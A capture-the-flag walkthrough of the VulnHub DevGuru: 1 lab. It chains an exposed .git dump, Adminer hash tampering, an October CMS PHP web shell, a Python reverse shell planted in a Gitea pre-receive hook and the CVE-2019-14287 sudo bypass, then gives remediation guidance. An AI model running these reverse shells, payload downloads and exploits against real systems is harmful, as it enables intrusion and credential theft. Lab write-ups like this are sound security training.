# DevGuru: 1 — When Your Dev Server Becomes a Root Shell

> A developer left the entire Git history of a production CMS site browseable from the internet. That single mistake handed us database credentials, an admin panel, a lateral pivot through a self-hosted Git server, and ultimately root via a decade-old sudo bug. Buckle up. ԅ(≖‿≖ԅ)

---

| Field | Value |
|---|---|
| **Level** | Hard |
| **Target VM** | DevGuru: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/devguru-1,620/ |
| **Techniques** | Git repo exposure, Adminer credential abuse, October CMS PHP RCE, Gitea pre-receive hook abuse, CVE-2019-14287 sudo bypass |
| **CVEs** | CVE-2019-14287 (sudo < 1.8.28 `!root` bypass) |
| **APT Groups** | APT28 (source code repo access for credential harvesting), FIN7 (web-facing app exploitation chains) |

---

## Attack Summary

```
[Attacker]
    |
    v
Nmap scan: ports 22, 80 (October CMS), 8585 (Gitea)
    |
    v
/.git/ exposed → GitTools dump → config/database.php: DB creds
    |
    v
Adminer (http://devguru.local/adminer.php) → MySQL login
    |
    v
backend_users table: bcrypt hash replaced → CMS admin login as frank
    |
    v
October CMS page snippet: PHP shell_exec → RCE → reverse shell (www-data)
    |
    v
/var/backup/app.ini.bak → Gitea DB creds → MySQL update Gitea user hash
    |
    v
Gitea pre-receive hook: Python reverse shell → lateral move to frank
    |
    v
sudo -l: (ALL, !root) NOPASSWD: /usr/bin/sqlite3
    |
    v
CVE-2019-14287: sudo -u#-1 sqlite3 → root shell → /root/root.txt
```

---

## Methodology

1. Reconnaissance with nmap and virtual host configuration.
2. Git repository dump via exposed `/.git/` using GitTools.
3. October CMS admin access by replacing bcrypt hash in Adminer.
4. Remote code execution through PHP snippet in CMS page, yielding `www-data` shell.
5. Gitea credential discovery from backup file; hash replacement for lateral access.
6. Pre-receive hook abuse in Gitea to pivot to user `frank`.
7. Privilege escalation via CVE-2019-14287 sudo bypass to root.

---

## Step 1 — Reconnaissance and Virtual Host Setup

**Why this matters:** Before touching anything, we map the attack surface. Three ports means three potential entry points, and the hostname matters because October CMS may use virtual host routing to decide what it serves.

```bash
# Full port scan with service/version detection and default scripts
# -p-: all 65535 ports; -A: OS detection + version + scripts + traceroute
nmap -p- -A $TARGET
```

Expected output (abbreviated):

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1
80/tcp   open  http    Apache/2.4.29 (October CMS)
8585/tcp open  http    Gitea (Git service)
```

Three ports open: SSH on 22, October CMS on 80, and Gitea on 8585. Noice. Add the hostname to `/etc/hosts`:

```
192.168.1.32    devguru.local
```

Browse to `http://devguru.local/` and confirm October CMS. Now check the obvious: is `/.git/` accessible?

```bash
curl -s -o /dev/null -w "%{http_code}" http://devguru.local/.git/HEAD
# 200 means the .git directory is fully exposed — that's a big brain mistake by whoever deployed this
```

**Real-world note:** In 2020, a security researcher found exposed `.git/` directories on thousands of production sites using simple Google dorks. Multiple APT28 intrusions began with exactly this technique, harvesting credentials from version-controlled config files.

**MITRE ATT&CK:** T1213 — Data from Information Repositories

---

## Step 2 — Git Repository Dump

**Why this matters:** An exposed `.git/` directory is not just a single leaked file. It is the entire object store of the repository, including commit history, config files, and potentially secrets that were committed and later deleted. GitTools reconstructs the full working tree from it.

```bash
# GitTools: gitdumper pulls all .git objects via HTTP
# extractor reconstructs the working tree from those objects
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://devguru.local/.git/ /tmp/devguru-dump

cd ../Extractor
./extractor.sh /tmp/devguru-dump /tmp/devguru-src
```

**Alternative:** `git-dumper` (pip install git-dumper) works the same way with a single command.

Navigate the recovered source:

```bash
grep -r "DB_PASSWORD\|DB_USER\|password" /tmp/devguru-src --include="*.php" -l
cat /tmp/devguru-src/*/config/database.php
```

Credentials recovered:

```
DB_USERNAME=october
DB_PASSWORD=SQ66EBYx4GT3byXH
DB_DATABASE=octoberdb
```

Also present in the recovered source: `adminer.php` at the web root. That is legit gold. ( ͡° ͜ʖ ͡°)

**Real-world note:** The 2022 Samsung source code leak included Git repositories with embedded credentials. GitTools-style extraction is exactly what threat actors use for supply chain reconnaissance.

**MITRE ATT&CK:** T1213 — Data from Information Repositories, T1552.001 — Credentials in Files

---

## Step 3 — October CMS Admin Access via Adminer

**Why this matters:** We have database credentials but no CMS admin password. Adminer is a single-file PHP database manager that lets us directly manipulate any table. The `backend_users` table holds bcrypt hashes; we replace frank's hash with one we know.

```bash
# Generate a bcrypt hash for a known password using htpasswd
# -B: use bcrypt; -n: output to stdout; -b: take password from command line
htpasswd -nbB fake rajchandel | cut -d: -f2
# Output (example): $2y$05$Sn6xmjXl3j9hNDLW3sKAHOoJLq/3Vj3nfChIAGg4...<hash>
```

Browse to `http://devguru.local/adminer.php` and log in:

```
Server:   localhost
Username: october
Password: SQ66EBYx4GT3byXH
Database: octoberdb
```

Go to table `backend_users`, find the row for `frank`, and UPDATE the `password` column with the new bcrypt hash. Log in at `http://devguru.local/backend` as `frank:rajchandel`.

**Alternative:** Use the MySQL CLI via `mysql -h devguru.local -u october -pSQ66EBYx4GT3byXH octoberdb` and run the UPDATE statement directly.

**Real-world note:** The FIN7 group used Adminer-style database panels exposed during Magecart attacks to inject JavaScript skimmers directly into CMS database content.

**MITRE ATT&CK:** T1078 — Valid Accounts, T1190 — Exploit Public-Facing Application

---

## Step 4 — RCE via October CMS PHP Snippet

**Why this matters:** October CMS allows PHP code inside page "Components." This is not a vulnerability per se — it is a feature that becomes catastrophic when arbitrary users have admin access. Any CMS that executes server-side code from the admin panel is a one-click RCE machine once the admin panel is owned.

Navigate to **CMS > Pages > New Page**. In the PHP section, add:

```php
function onStart() {
    $this->page["myVar"] = shell_exec($_GET['cmd']);
}
```

In the Twig template section, add:

```twig
{{ page.myVar }}
```

Save and test:

```
http://devguru.local/mypage?cmd=id
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

fr fr, that is RCE confirmed. Now weaponize it:

```bash
# Attacker: serve a PHP reverse shell (use pentestmonkey's php-reverse-shell.php)
python3 -m http.server 8000

# Deliver via the cmd parameter:
# http://devguru.local/mypage?cmd=wget%20http%3A%2F%2F$LHOST%3A8000%2Fshell.php%20-O%20/tmp/shell.php

# Start the listener:
nc -lvnp $LPORT

# Trigger the shell:
# http://devguru.local/mypage?cmd=php%20/tmp/shell.php
```

Shell lands as `www-data`. ᕕ( ᐛ )ᕗ

**Alternative:** Use a Python one-liner or a Bash /dev/tcp reverse shell instead of the PHP file.

**Real-world note:** CWE-94 (Code Injection) via CMS template engines is one of the most common initial access vectors in e-commerce breaches. The 2023 Magento/Adobe Commerce attacks by Sansec documented PHP snippets being injected into CMS blocks to harvest payment data.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell, T1505.003 — Server Software Component: Web Shell

---

## Step 5 — Gitea Credential Discovery from Backup

**Why this matters:** `www-data` can read certain system files. Backup files stored outside the web root but readable by the web process are a classic post-exploitation goldmine. The pattern `*.bak`, `*.old`, `*.backup` in `/var/backup/` is worth checking on any Linux box.

```bash
cat /var/backup/app.ini.bak
```

Output (relevant excerpt):

```ini
[database]
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
PASSWD              = UfFPTF8C8jjxVF2m
```

Now update frank's Gitea password hash to something we know:

```bash
mysql -u gitea -pUfFPTF8C8jjxVF2m gitea
```

```sql
SELECT name, passwd FROM user;
UPDATE user SET passwd='<bcrypt_of_rajchandel>', passwd_hash_algo='bcrypt' WHERE name='frank';
```

Log into Gitea at `http://devguru.local:8585` as `frank:rajchandel`.

**MITRE ATT&CK:** T1552 — Unsecured Credentials, T1083 — File and Directory Discovery

---

## Step 6 — Gitea Pre-Receive Hook Abuse (Lateral Movement)

**Why this matters:** Gitea server-side Git hooks execute arbitrary shell commands on the server as the Gitea process owner. Pre-receive hooks run before a commit is accepted. This makes any Gitea admin with repository access capable of running code on the underlying OS. This is not a misconfiguration specific to Gitea; it is fundamental to how Git hooks work.

In Gitea, navigate to: **devguru-website repository > Settings > Git Hooks > pre-receive**.

Add the following hook:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Start a new listener:

```bash
nc -lvnp $LPORT
```

Trigger the hook: edit any file (e.g., `README.md`) through the Gitea web UI and commit. The pre-receive hook fires, and a shell arrives as `frank`.

```bash
cat /home/frank/user.txt
```

**Real-world note:** In 2021, CI/CD pipeline abuse (a conceptual cousin of Git hook abuse) was used in the SolarWinds supply chain attack by APT29/Cozy Bear to inject malicious code into build pipelines. Securing server-side hooks is a specific item in the SLSA (Supply Chain Levels for Software Artifacts) framework.

**MITRE ATT&CK:** T1072 — Software Deployment Tools, T1059.006 — Command and Scripting Interpreter: Python

---

## Step 7 — Privilege Escalation via CVE-2019-14287

**Why this matters:** Sudo's `!root` directive is meant to prevent a user from running a command as root. CVE-2019-14287 shows that specifying UID `-1` bypasses this check entirely, because the kernel maps UID -1 (an unsigned value) to UID 0 (root). This affects all sudo versions before 1.8.28.

```bash
# Check sudo privileges and sudo version
sudo -l
sudo --version
```

Output from `sudo -l`:

```
(ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

The `!root` clause is meant to prohibit running as root. With CVE-2019-14287:

```bash
# -u#-1 specifies UID -1, which resolves to root (UID 0) due to integer wraparound
# sqlite3's .shell command spawns a shell
sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

ez pz root. (☞ﾟヮﾟ)☞

**Alternative:** `sudo -u#-1 sqlite3 /dev/null '.shell id'` to verify before spawning the shell.

**Real-world note:** CVE-2019-14287 was patched in October 2019. As of 2023, Shodan scans still found thousands of Internet-facing servers running sudo < 1.8.28. This vuln is catalogued in CISA's Known Exploited Vulnerabilities list.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| DB credential | `october:SQ66EBYx4GT3byXH` | `config/database.php` (git dump) | Used to log into Adminer |
| CMS bcrypt hash | Replaced in `backend_users` | Adminer — `octoberdb.backend_users` | Used to log in as `frank` in October CMS |
| Gitea DB credential | `gitea:UfFPTF8C8jjxVF2m` | `/var/backup/app.ini.bak` | Used to update Gitea user hash |
| User flag | `/home/frank/user.txt` | Obtained after Gitea hook RCE | Proof of user `frank` |
| Root flag | `/root/root.txt` | Obtained after sudo CVE-2019-14287 | Final proof |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | `.git/` directory exposed on production web server | Seen in thousands of production sites; used for credential harvesting by APT28 | Block `/.git/` at the web server level; deploy to web root only build artifacts, not the VCS directory |
| 2 | Adminer left accessible at a guessable path | Database admin panels exposed to the internet are a direct data breach vector | Remove Adminer after use; if required, protect with IP allowlist and authentication |
| 3 | CMS allows arbitrary PHP execution in templates | Any CMS with server-side template execution is a remote code execution machine if the admin panel is compromised | Implement a WAF rule blocking PHP execution in template content; sandbox template rendering |
| 4 | Backup file with credentials readable by web process | Defense-in-depth failure: secrets in backup files compensate for no secret management | Use secrets managers (HashiCorp Vault, AWS Secrets Manager); never store credentials in backup files readable by application processes |
| 5 | Gitea server-side hook execution | CI/CD hook abuse is a documented supply chain attack technique (MITRE T1072) | Restrict Git hook editing to repository owners; review hooks in security audits |
| 6 | sudo < 1.8.28 with `!root` directive | CVE-2019-14287 is in CISA KEV; actively exploited in post-exploitation phases | Patch sudo; audit `sudo -l` entries for `!root` patterns |

Connecting with the real world: the chain in DevGuru mirrors exactly the kind of development server exposure that has led to major breaches. Developers spin up a CMS site, forget to disable directory listing for `.git/`, and suddenly the entire application source is public. When that source contains database credentials (which it almost always does), the blast radius extends to database access, admin panel takeover, and server-level code execution. OWASP lists sensitive data exposure and security misconfiguration among its top 10 for a reason.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|---|---|---|---|
| Reconnaissance | Discovery | Data from Information Repositories | T1213 |
| Initial Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Defense Evasion | Valid Accounts | T1078 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Lateral Movement | Lateral Movement | Software Deployment Tools (Git hook) | T1072 |
| Execution | Execution | Command and Scripting Interpreter: Python | T1059.006 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Discovery | Discovery | File and Directory Discovery | T1083 |

---

## Remediation and Containment

### Technical Fixes

1. Block `.git/` access at the web server level. For Apache: `<DirectoryMatch "^(.*/)?\.git/">Deny from all</DirectoryMatch>`. For Nginx: `location ~ /\.git { deny all; }`.
2. Remove Adminer from the web root after database setup tasks. If retained, restrict access by IP.
3. Disable PHP execution in October CMS page snippets via CMS permissions configuration; run the CMS in a non-privileged container.
4. Store all secrets in environment variables injected at runtime; use HashiCorp Vault or AWS Secrets Manager. Never commit credentials to source control.
5. Restrict backup file permissions: `chown root:root /var/backup/app.ini.bak && chmod 600 /var/backup/app.ini.bak`.
6. Audit Gitea server-side hooks; remove any pre-receive hooks that execute shell commands; restrict hook editing to repository administrators.
7. Upgrade sudo to version 1.8.28 or later: `apt-get upgrade sudo`.
8. Audit `sudo -l` for all non-root users; remove `!root` patterns on older sudo installs.

### If You Find This in Your Environment

- Immediately rotate all credentials found in the exposed `.git/` directory.
- Disable Adminer or restrict by IP.
- Check the `backend_users` table for unauthorized password changes.
- Audit Gitea hooks for injected reverse shells.
- Review `/var/backup/` for world-readable files containing credentials.
- Check `/var/log/auth.log` for unexpected `su` or `sudo` usage.

### MITRE D3FEND Countermeasures

- D3-ACH: Application Configuration Hardening (disable Adminer, restrict `.git/`)
- D3-PRA: Process Argument Spoofing Prevention (sudo patching)
- D3-SAOR: Source Code Repository Monitoring

### NIST CSF 2.0

| Function | Action |
|---|---|
| Identify | Asset inventory of web-exposed directories and CMS components |
| Protect | Web server hardening: block `.git/`, disable Adminer, secrets management |
| Detect | File integrity monitoring on web root; alerting on abnormal `sudo` usage |
| Respond | Credential rotation, hook audit, backup file review |
| Recover | Restore from a clean backup; verify no persistence mechanisms remain |

### NIST SP 800-53 Rev. 5

- **AC-3** — Access Enforcement: restrict database admin panel access by IP and authentication.
- **CM-6** — Configuration Settings: enforce web server configs that block `.git/` exposure.
- **IA-5** — Authenticator Management: rotate credentials found in exposed repositories.
- **SI-2** — Flaw Remediation: patch sudo (CVE-2019-14287) as part of a vulnerability management program.
- **AU-2** — Event Logging: log and alert on `sudo -u#-1` invocations.

### CISA KEV

CVE-2019-14287 (sudo < 1.8.28 privilege escalation) was added to the CISA Known Exploited Vulnerabilities catalog. Organizations covered by CISA BOD 22-01 must remediate this within the mandated timeframe.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Assets | MIL-2 |
| Identity and Access Management (ACCESS) | Manage Privileges | MIL-3 |
| Situation Awareness (SITUATION) | Perform Logging | MIL-2 |

---

## Final Thoughts

Mad respect to the creator of DevGuru for building an attack chain that flows so naturally from one mistake to the next. The `.git/` exposure is not some exotic edge case; it is one of the most common findings in real-world pentests. Chaining it to Adminer, then to CMS RCE, then to a backup file, then to a Git hook, and finally to a sudo CVE creates a scenario that genuinely mirrors how production breaches unfold.

If this machine frustrated you at any point, that frustration is the lab working as intended. Real attacker patience is rewarded. Real defenders learn from exactly this chain.

Keep hacking, keep learning, and never deploy your `.git/` directory to production. ಠᴗಠ

Thanks guys!! (❍ᴥ❍ʋ)
